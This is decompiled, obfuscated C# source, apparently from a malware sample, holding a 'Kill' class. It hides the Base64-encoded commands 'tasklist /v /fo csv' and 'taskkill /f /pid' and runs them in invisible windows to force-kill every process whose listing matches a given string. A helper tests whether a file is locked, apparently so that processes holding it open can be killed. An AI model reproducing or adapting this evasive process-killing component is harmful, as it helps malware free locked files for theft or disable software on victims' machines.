using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace MufMaOSvGyvz
{
	// Token: 0x0200000A RID: 10
	internal class Kill
	{
		// Token: 0x06000028 RID: 40
		public static bool ReadStream(string string_0)
		{
			FileStream fileStream = null;
			try
			{
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			}
			catch (UnauthorizedAccessException)
			{
				try
				{
					fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
				}
				catch (Exception)
				{
					return true;
				}
			}
			catch (Exception)
			{
				return true;
			}
			finally
			{
				fileStream.Close();
			}
			return false;
		}

		// Token: 0x06000029 RID: 41
		public static void KillProcess(string string_0)
		{
			Func<string, bool> func = null;
			Kill.WaYodAhqFAmW waYodAhqFAmW = new Kill.WaYodAhqFAmW();
			waYodAhqFAmW.dBjhKErYpbQ = string_0;
			try
			{
				string text = Kill.Init(MainCore.DecodeBase64("dGFza2xpc3Q="), MainCore.DecodeBase64("L3YgL2ZvIGNzdg==")); // dGFza2xpc3Q= -> tasklist  L3YgL2ZvIGNzdg== -> /v /fo csv
				string[] separator = new string[]
				{
					"\r\n"
				};
				string[] array = text.Split(separator, StringSplitOptions.None);
				IEnumerable<string> source = array;
				if (func == null)
				{
					func = new Func<string, bool>(waYodAhqFAmW.<Killproc>b__4);
				}
				IEnumerable<string> source2 = source.Where(func);
				if (Kill.CS$<>9__CachedAnonymousMethodDelegate8 == null)
				{
					Kill.CS$<>9__CachedAnonymousMethodDelegate8 = new Func<string, string[]>(Kill.<Killproc>b__5);
				}
				IEnumerable<string[]> source3 = source2.Select(Kill.CS$<>9__CachedAnonymousMethodDelegate8);
				if (Kill.CS$<>9__CachedAnonymousMethodDelegate9 == null)
				{
					Kill.CS$<>9__CachedAnonymousMethodDelegate9 = new Func<string[], string>(Kill.<Killproc>b__6);
				}
				List<string> list = source3.Select(Kill.CS$<>9__CachedAnonymousMethodDelegate9).ToList<string>();
				foreach (string str in list)
				{
					Kill.Init(MainCore.DecodeBase64("dGFza2tpbGw="), MainCore.DecodeBase64("L2YgL3BpZCA=") + str); // dGFza2tpbGw= -> taskkill L2YgL3BpZCA= -> /f /pid 
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600002A RID: 42
		public static string Init(string string_0, string string_1)
		{
			string result;
			try
			{
				Process process = Process.Start(new ProcessStartInfo(string_0, string_1)
				{
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					StandardOutputEncoding = Encoding.GetEncoding("UTF-8"),
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = false,
					CreateNoWindow = true
				});
				string str;
				using (StreamReader standardOutput = process.StandardOutput)
				{
					str = standardOutput.ReadToEnd();
				}
				string str2;
				using (StreamReader standardError = process.StandardError)
				{
					str2 = standardError.ReadToEnd();
				}
				process.WaitForExit();
				result = str2 + str;
			}
			catch (Exception ex)
			{
				result = ex.Message + "\n<------------>\n" + ex.StackTrace;
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00006384 File Offset: 0x00004584
		private static string[] <Killproc>b__5(string string_0)
		{
			return string_0.Split(new char[]
			{
				','
			});
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000063A8 File Offset: 0x000045A8
		private static string <Killproc>b__6(string[] string_0)
		{
			return string_0[1].Replace("\"", "");
		}

		// Token: 0x0400005A RID: 90
		public static readonly List<string> QufHrMMQEgM = new List<string>();

		// Token: 0x0400005B RID: 91
		public static readonly List<string> pbLugJQHtEkvAi = new List<string>();

		// Token: 0x0400005C RID: 92
		private static Func<string, string[]> CS$<>9__CachedAnonymousMethodDelegate8;

		// Token: 0x0400005D RID: 93
		private static Func<string[], string> CS$<>9__CachedAnonymousMethodDelegate9;

		// Token: 0x0200000B RID: 11
		private sealed class WaYodAhqFAmW
		{
			// Token: 0x06000030 RID: 48 RVA: 0x000025D1 File Offset: 0x000007D1
			public bool <Killproc>b__4(string string_0)
			{
				return string_0.Contains(this.dBjhKErYpbQ);
			}

			// Token: 0x0400005E RID: 94
			public string dBjhKErYpbQ;
		}
	}
}
